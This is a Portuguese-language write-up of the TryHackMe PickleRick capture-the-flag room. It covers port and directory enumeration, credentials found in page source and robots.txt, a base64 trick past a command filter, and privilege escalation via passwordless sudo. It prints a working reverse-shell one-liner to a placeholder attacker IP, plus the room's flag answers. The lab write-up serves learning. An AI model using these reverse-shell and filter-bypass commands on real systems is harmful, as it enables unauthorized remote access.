# PickleRick Writeup

> [!NOTE] 
> **[EN]** This version of the writeup is in portuguese. Click [here]() or follow [this link (github)]() to go to the english version.

> **Link para o desafio CTF**: https://tryhackme.com/room/picklerick
> **Dificuldade:** `Fácil`
> **Data de Resolução:** `2026/04/03`
## Sumário

> Link do writeup no github: [https://github.com/Luke0133/offsec-ctf/blob/main/CTFs/PickleRick/(PT-BR)%20PickleRick%20Writeup.md](https://github.com/Luke0133/offsec-ctf/blob/main/CTFs/PickleRick/(PT-BR)%20PickleRick%20Writeup.md)

- [Ferramentas Utilizadas](#ferramentas%20utilizadas)
- [Resolução do CTF](#Resolução%20do%20CTF)
	1. [Reconhecimento](#Reconhecimento)
	2. [Exploração](#Exploração)
	3. [Escalação de Privilégios](#Escalação%20de%20Privilégios)
- [Conclusão](#Conclusão)
- [Referências](#Referências)

## Ferramentas Utilizadas

Para este CTF, foram utilizadas as seguintes ferramentas:
- [Nmap](https://nmap.org/)[^nmap]: ferramenta de exploração da internet, criada para escanear rapidamente redes de larga escala. O Nmap realiza diversas requisições para um IP para determinar quais hosts estão disponíveis naquela rede, quais serviços que eles oferecem (por exemplo, HTTP, ssh, ...), quais sistemas operacionais (e versões destes) estão utilizando dentre outras informações. Sendo uma ferramenta poderosa para a enumeração de serviços e fornecimento de informações básicas sobre os hosts de uma rede, dados essenciais para alguém que está tentando invadir um sistema, o Nmap é muito utilizado em situações de pentesting e geralmente faz parte do primeiro passo nos CTFs.
- [Gobuster](https://github.com/OJ/gobuster)[^gobuster]: ferramenta responsável por enumerar por força bruta diretórios e arquivos, detectar subdomínios DNS e hosts virtuais, dentre outras funções. Por ser de alta performance, o Gobuster é essencial para agilizar o processo de encontrar diretórios de sistemas, poupando o desgaste da pessoa invasora de procurá-los manualmente, sendo, portanto recomendado para CTFs e pentesting.
- [Netcat](http://www.stearns.org/nc/)[^netcat]: programa basico de Unix responsável por ler e escrever dados através de conexões de rede. Em um contexto de pentesting, o netcat é uma ótima ferramenta para criar conexões com os sistemas na rede e ter acesso a eles de forma remota, permitindo técnicas como a de reverse shell, muito importante também nos contextos de CTF.

Bem como recursos como:
- [Reverse Shell Generator (revshells)](https://www.revshells.com/)[^revshellgen]: site contendo códigos e comandos para gerar shells reversas de diversas maneiras, sendo então flexível para cada situação
- [GTFOBins](https://gtfobins.org/)[^gtfo]:  lista de executáveis estilo Unix que permitem ultrapassar restrições de segurança em sistemas vulneráveis, muito útil para realizar escalação de privilégio. Assim como o site anterior, contém um compilado de funções para várias situações.


## Resolução do CTF

O CTF PickleRick, disponível no TryHackMe, é um desafio de dificuldade fácil que requer a exploração de um servidor web para achar três ingredientes (as flags desse CTF). Neste CTF foram exploradas vulnerabilidades em um servidor web, como traços em código fonte e caixas de texto que permitiram a escalação de privilégios. 

Após conectar-me ao VPN do TryHackMe, obtive acesso à maquina e iniciei o desafio. A estratégia usada foi dividida em duas partes:

1. [Reconhecimento](#Reconhecimento)
2. [Exploração](#Exploração)
3. [Escalação de Privilégios](#Escalação%20de%20Privilégios)
### Reconhecimento

A primeira coisa que fiz para o reconhecimento da máquina-alvo foi uma enumeração da rede com o nmap, executando:

```sh 
nmap -T4 -A <TARGET_IP>  
```

em que `-T4` representa o template de temporização (de 0 a 5, quanto maior, mais rápido, ou seja, mais interações e menos discrição, o que não costuma ser um problema em CTFs básicos) e `-A` habilita a detecção de SO, detecção de versão, traceroute e scan de scripts. Dados relevantes da enumeração estão a seguir:

```sh
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-03 08:27 EDT
Nmap scan report for <TARGET_IP>
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e7:7f:86:3f:50:36:78:a0:bb:ce:d1:37:09:30:6e:5d (RSA)
|   256 85:46:6a:3f:85:71:e3:3e:19:f8:a9:24:f5:40:7d:71 (ECDSA)
|_  256 3d:19:5d:0d:9d:93:9d:f1:bd:f5:9e:40:38:38:c0:dd (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

em que percebi que o sistema era baseado em Apache, com as portas 22 e 80 abertas (ssh e http). Como o serviço http estava disponível, decidi explorá-lo. Todavia, enquanto eu abria a página web, já decidi executar um comando no gobuster, para adiantar a enumeração de diretórios:

```sh
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<TARGET_IP>/ -x php,html,txt -t 50
```

Este comando busca os diretórios com a wordlist fornecida (`-w`, com uma wordlist média contendo uma lista de diretórios mais comuns), no url fornecido (`-u`) e com as extensões fornecidas (`-x`, em que coloquei as mais comuns como php, html e txt), na quantidade de threads fornecida (`-t`, e, mais uma vez, discrição não é essencial nesse CTF, então o número escolhido foi alto para agilizar o processo). O resultado final obtido foi o seguinte:

```sh
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<TARGET_IP>/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 1062]
/.html                (Status: 403) [Size: 277]
/login.php            (Status: 200) [Size: 882]
/assets               (Status: 301) [Size: 313] [--> http://<TARGET_IP>/assets/]
/portal.php           (Status: 302) [Size: 0] [--> /login.php]
/robots.txt           (Status: 200) [Size: 17]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/denied.php           (Status: 302) [Size: 0] [--> /login.php]
/server-status        (Status: 403) [Size: 277]
/clue.txt             (Status: 200) [Size: 54]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Os resultados finais dessa enumeração serão discutidos durante a fase de exploração, pois comecei a exploração ao mesmo tempo que executei o gobuster.

### Exploração

Ao acessar a página inicial (index.php), me deparei com a seguinte tela:

![pagina inicial](UnB/Offsec/CTFs/PickleRick/assets_picklerick/rick_index.png)

A tela inicial em si não continha nenhuma informação relevante, fora o fato de serem três flags (três ingredientes) que eu deveria encontrar, o que eu já sabia, dado a página do CTF no TryHackMe. Enquanto o gobuster rodava, verifiquei o código fonte dessa página e encontrei um nome de usuário escondido nos comentários do html:

```html
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--
    Note to self, remember username!
    Username: R1ckRul3s
  -->

</body>
```

Também vi que existia o diretório assets, mas nenhum dos arquivos lá era de interesse:

![picklerick_assets.png](UnB/Offsec/CTFs/PickleRick/assets_picklerick/picklerick_assets.png)

Nesse momento, o gobuster indicou uma página nova: `/login.php`, em que eu poderia colocar um usuário (e eu tinha o nome de um usuário, `R1ckRul3s`) e uma senha, essa era a que faltava. Testei algumas senhas básicas, como o nome do próprio usuário, "admin", dentre outras, mas nenhuma funcionou.

| ![picklerick_login.png](UnB/Offsec/CTFs/PickleRick/assets_picklerick/picklerick_login.png) |
| :-------------------------------------------------------------: |
|    *Tela de login, presente em http://<TARGET_IP>/login.php*    |
|                                                                 |
Nesse momento, porém, descobri um novo diretório: `robots.txt` [^robots]. Esse arquivo é comumente utilizado para indicar outros robôs e web crawlers quais locais eles podem visitar, então ele pode conter algo interessante. Ao acessar `http://<TARGET_IP>/robots.txt`, encontrei o seguinte:

```
Wubbalubbadubdub
```

Testei o nome de usuário que eu tinha com o texto acima como senha e consegui acessar o diretório `/portal.php`, que antes me redirecionava para a página de login. Nessa página, havia um painel de comandos, bem como outras abas (as quais não continham nada útil):

![picklerick_cmd.png](UnB/Offsec/CTFs/PickleRick/assets_picklerick/picklerick_cmd.png)

Decidi então testar algum comando nessa caixa de texto, `ls`, e consegui listar os arquivos e diretórios do site:

![picklerick_cmd_ls.png](UnB/Offsec/CTFs/PickleRick/assets_picklerick/picklerick_cmd_ls.png)

Com isso, encontrei um arquivo chamado `Sup3rS3cretPickl3Ingred.txt`. Ao tentar realizar a leitura com `cat`, vi que o comando não era permitido pelo site:

![picklerick_cmd_cat.png](UnB/Offsec/CTFs/PickleRick/assets_picklerick/picklerick_cmd_cat.png)

Então, decidi codificar o comando para base 64 e executá-lo na caixa de texto:
```sh
$ echo -n "cat Sup3rS3cretPickl3Ingred.txt" | base64
Y2F0IFN1cDNyUzNjcmV0UGlja2wzSW5ncmVkLnR4dA==
```
 em que o `-n` retira o caracter de linha nova e, assim, no painel de comandos do site foi possível descobrir o conteúdo da flag:
 
![picklerick_cmd_64.png](UnB/Offsec/CTFs/PickleRick/assets_picklerick/picklerick_cmd_64.png)

Vale notar que também era possível acessar os conteúdos do arquivo com o comando `less`, sem precisar de codificar para base 64.

A partir disso, comecei a explorar o sistema em si, procurando por uma flag de usuário. Apesar de ser possível explorar a partir do diretório atual no próprio sistema, decidi criar uma reverse shell[^reverseshell], o que permitiria explorar mais facilmente os arquivos da máquina-alvo. Primeiramente, abri uma escuta com o netcat[^netcat]:

```bash 
netcat -lnvp 1234 
```

contendo os seguintes argumentos argumentos:
- `-l`: modo de escuta, justamente para receber as informações do terminal do outro sistema
-  `-n`: desativar o DNS, uma vez que já temos o IP direto, não é necessário ficar resolvendo nomes, deixando o netcat mais rápido
-  `-v`: modo verboso, para ter mais informações, no caso de problemas, por exemplo
-  `-p`: indica a porta de escuta, no caso `1234`

E acessei o site revshells.com[^revshellgen], executando o seguinte comando:

```bash
sh -i >& /dev/tcp/<MY_IP>/1234 0>&1
```

Esse comando, enviado na caixa de texto do site, inicia uma shell interativa (`-i`), abrindo uma conexão TCP para um host remoto (`/dev/tcp/<MY_IP>/1234`), redirecionando output e erros para essa conexão (`>&`), bem como recebendo entradas dessa conexão (`0>&1`), ou seja, cria uma reverse shell. Todavia, esse comando não funcionou, então tentei usar com o `echo`:

```bash
echo "sh -i >& /dev/tcp/<MY_IP>/1234 0>&1" | bash
```

Assim, obtive acesso remoto a uma shell na máquina-alvo, conferindo com um simples:

 ```
 $ whoami
 www-data
 ```

Com isso, eu pude navegar pelos arquivos. Vale notar que eu poderia ter feito isso antes de encontrar a primeira flag, evitando a necessidade do bypass de comandos para o `cat`:

```
$ cat Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
```

Fui até o diretório home, em que havia dois diretórios `rick` e `ubuntu`, e, no primeiro, encontrei a flag de usuário, no arquivo `second ingredients`. Um simples `cat` me revelou os seus conteúdos:
`
```
$ cat second ingredients
1 jerry tear
```

### Escalação de Privilégios

Por fim, era necessário escalar privilégios e encontrar a flag em `/root`. Para isso, testei no terminal as permissões do usuário:

```
$ sudo -l
Matching Defaults entries for www-data on ip-10-64-166-94:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-64-166-94:
    (ALL) NOPASSWD: ALL
```

Ou seja, o `ww-data` continha privilégio total de super user e não necessitava de senha. Portanto, por meio do comando fornecido em GTFOBins[^gtfo] para usar com sudo (já que eu tenho a permissão de executá-lo sem senha), enviei a linha a seguir: 

```
$ sudo /bin/sh
whoami
root
```

Com uma shell criada com privilégio de super user (`sudo /bin/sh`), encontrei a flag em `/root/3rd.txt`:

```
cat 3rd.txt
3rd ingredients: fleeb juice
```

e finalizei o CTF.

O interessante dessa vulnerabilidade de o fornecimento de privilégio total para um usuário comum como o `www-data` sem a necessidade de senhas é que era possível obter todas as 3 flags sem a necessidade de criação de uma reverse shell, simplesmente por injeção de comandos na caixa de texto do site. Um simples `sudo less /root/3rd.txt` listaria os conteúdos da flag de root. Apesar disso, decidi seguir dessa maneira no CTF por ser mais prático que ter que navegar pelo sistema por uma caixa de texto.

## Conclusão

O CTF PickleRick permitiu explorar a vulnerabilidade de uma caixa de texto que permitia a execução de comandos. Após o reconhecimento das portas disponíveis, da enumeração de diretórios e da exploração no site disponibilizado pela máquina-alvo, foi possível encontrar usuário e senha que permitiam o acesso a essa caixa de texto, a partir da qual consegui explorar os arquivos da máquina em si, criar uma reverse shell para facilitar a exploração e escalar privilégios por o sistema ter dado acesso completo e sem senha para o usuário comum `www-data`, de modo que consegui ler todas as flags do desafio. Como dito anteriormente, há outras maneiras de realizar esse processo, e listei algumas ao longo desse writeup.
## Referências

[^nmap]: Nmap: [https://nmap.org/](https://nmap.org/)
[^gobuster]: Gobuster: [https://github.com/OJ/gobuster](https://github.com/OJ/gobuster)
[^netcat]: Netcat: [http://www.stearns.org/nc/](http://www.stearns.org/nc/)
[^revshellgen]: Reverse Shell Generator (revshells): [https://www.revshells.com/](https://www.revshells.com/)
[^gtfo]: GTFOBins: [https://gtfobins.org/](https://gtfobins.org/)
[^robots]: Sobre `robots.txt`: [https://wikipedia.org/wiki/Robots.txt](https://wikipedia.org/wiki/Robots.txt); [https://www.robotstxt.org/](https://www.robotstxt.org/)
[^reverseshell]: Sobre reverse shells: [https://en.wikipedia.org/wiki/Shell_shoveling](https://en.wikipedia.org/wiki/Shell_shoveling)
